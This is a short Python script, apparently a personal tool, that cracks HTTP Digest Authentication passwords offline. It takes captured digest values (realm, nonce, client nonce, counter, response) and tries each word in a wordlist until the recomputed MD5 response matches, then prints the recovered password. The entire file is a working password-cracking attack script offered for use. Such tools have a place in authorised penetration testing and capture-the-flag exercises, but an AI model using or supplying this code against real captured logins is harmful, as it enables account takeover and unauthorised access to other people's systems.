# Usage:
# python http_digest_crack.py --username USERNAME --wordlist WORLDLIST --method GET --realm REALM --uri URI --nonce NONCE --cnonce CNONCE --response RESPONSE --qop auth --nc NC


from argparse import ArgumentParser
from sys import exit
from hashlib import md5
from pyfiglet import figlet_format


def HttpDigestAuth_PassCrack():
    parser = ArgumentParser(
        description="HTTP Digest Authentication Password Cracker")
    parser.add_argument("--username", help="Username",
                        metavar='', required=True)
    parser.add_argument("--wordlist", help="Wordlist Path",
                        metavar='', required=True)
    parser.add_argument("--method", help="HTTP Method",
                        metavar='', required=True)
    parser.add_argument("--realm", help="Realm", metavar='', required=True)
    parser.add_argument("--uri", help="URI", metavar='', required=True)
    parser.add_argument("--nonce", help="Nonce", metavar='', required=True)
    parser.add_argument("--cnonce", help="Client Nonce",
                        metavar='', required=True)
    parser.add_argument("--response", help="Response",
                        metavar='', required=True)
    parser.add_argument("--qop", help="Quality of Protection",
                        metavar='', required=True)
    parser.add_argument("--nc", help="Nonce Counter",
                        metavar='', required=True)
    args = parser.parse_args()

    username = args.username
    wordlist = args.wordlist
    method = args.method
    realm = args.realm
    uri = args.uri
    nonce = args.nonce
    cnonce = args.cnonce
    response = args.response
    qop = args.qop
    nc = args.nc

    print(figlet_format("MBZ0x7"))
    try:
        with open(args.wordlist) as file:
            passDict = file.read().splitlines()
    except IOError:
        exit("File not accessible!!")

    count = 0
    for password in passDict:
        h1 = md5((username+":"+realm+":"+password).encode()).hexdigest()
        h2 = md5((method+":"+uri).encode()).hexdigest()
        count += 1

        brutedResp = md5((h1+":"+nonce+":"+nc+":"+cnonce +
                         ":"+qop+":"+h2).encode()).hexdigest()

        if brutedResp == response:
            print(f"Username = {username}\nPassword = {password}\n---------")
            exit("Password found in the attempt number "+str(count)+".")

    print("Password not found, change your dictionary!")


if __name__ == '__main__':
    HttpDigestAuth_PassCrack()
